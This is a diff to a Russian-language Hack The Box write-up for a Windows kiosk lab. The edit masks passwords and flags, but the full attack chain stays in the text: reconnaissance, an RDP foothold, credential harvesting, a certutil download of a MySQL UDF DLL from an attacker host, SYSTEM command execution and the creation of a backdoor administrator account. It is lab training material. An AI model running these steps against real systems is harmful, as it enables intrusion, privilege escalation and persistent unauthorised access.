@@ -14,12 +14,12 @@
 Reconnaissance
 ├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
 ├── ffuf /FUZZ → /login (200), /api (403)
-└── ffuf /api/FUZZ → /api/status → serial NX-DH-2024-B7042
+└── ffuf /api/FUZZ → /api/status → serial <SERIAL>
 
 Foothold (DeviceHub → RDP)
-├── /login → password = serial (NX-DH-2024-B7042)
-├── Найдены креды: KioskUser / K!0sk2026#
-├── xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.71.63
+├── /login → password = serial (<SERIAL>)
+├── Найдены креды: KioskUser / <PASSWORD>
+├── xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63
 └── Kiosk HTB Airways
 
 Kiosk Escape
@@ -51,13 +51,13 @@ Enumeration (Source Code)
 ├── C:\MySQL\ (MySQL Server 8.0)
 ├── document-service.ts → OCR MRZ (tesseract.js)
 ├── staff.ts → QR HTBAW-STAFF:<email>:<authCode>
-├── database/index.ts → kiosk_app:K!0sk_R3pl1ca#DB
+├── database/index.ts → kiosk_app:<PASSWORD>
 └── MySQL → SELECT * FROM _htb_staff
 
 Credential Leak (MySQL root)
 ├── C:\ProgramData\HTB Airways\db-config.ini
 ├── C:\ProgramData\HTB Airways\refresh-dates.bat
-│   └── -u root -pHTB@irw4ys_DB!2026
+│   └── -u root -p<PASSWORD>
 ├── SELECT user, host, Grant_priv, File_priv FROM mysql.user → root:Y:Y
 └── icacls C:\MySQL\lib\plugin → Authenticated Users:(M)
 
@@ -68,6 +68,8 @@ Privilege Escalation (MySQL UDF Hijacking)
 ├── SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt') → <ROOT_FLAG>
 └── Опционально: net user hacker /add → Administrators → RDP/WinRM
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -111,7 +113,7 @@ ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-C
 `/api/status` отдаёт:
 
 ```json
-{"serial":"NX-DH-2024-B7042","status":"online", ...}
+{"serial":"<SERIAL>","status":"online", ...}
 ```
 
 ---
@@ -123,19 +125,19 @@ ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-C
 Пароль:
 
 ```
-NX-DH-2024-B7042
+<SERIAL>
 ```
 
 В панели DeviceHub:
 
 ```
-KioskUser / K!0sk2026#
+KioskUser / <PASSWORD>
 ```
 
 ### RDP
 
 ```bash
-xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.71.63 /clipboard /dynamic-resolution
+xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63 /clipboard /dynamic-resolution
 ```
 
 Полноэкранный киоск HTB Airways.
@@ -265,12 +267,12 @@ type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
 host: 127.0.0.1
 port: 3306
 user: kiosk_app
-password: K!0sk_R3pl1ca#DB
+password: <PASSWORD>
 database: htb_airways
 ```
 
 ```cmd
-C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
+C:\MySQL\bin\mysql.exe -u kiosk_app -p<PASSWORD> -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
 ```
 
 ---
@@ -286,7 +288,7 @@ type "C:\ProgramData\HTB Airways\refresh-dates.sql"
 `refresh-dates.bat`:
 
 ```bat
-C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql"
+C:\MySQL\bin\mysql.exe -u root -p<PASSWORD> < "C:\ProgramData\HTB Airways\refresh-dates.sql"
 ```
 
 ---
@@ -294,7 +296,7 @@ C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airway
 ## Проверка прав root
 
 ```powershell
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
 ```
 
 ```
@@ -332,13 +334,13 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 Создание функции:
 
 ```powershell
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
 ```
 
 Проверка:
 
 ```powershell
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('whoami');"
 # nt authority\system
 ```
 
@@ -349,7 +351,7 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 ## Root flag
 
 ```powershell
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
 ```
 
 ```
@@ -359,8 +361,8 @@ certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\
 ### Опционально - интерактивный SYSTEM
 
 ```powershell
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
-& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
+& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
 ```
 
 Далее - RDP/WinRM как `hacker`.
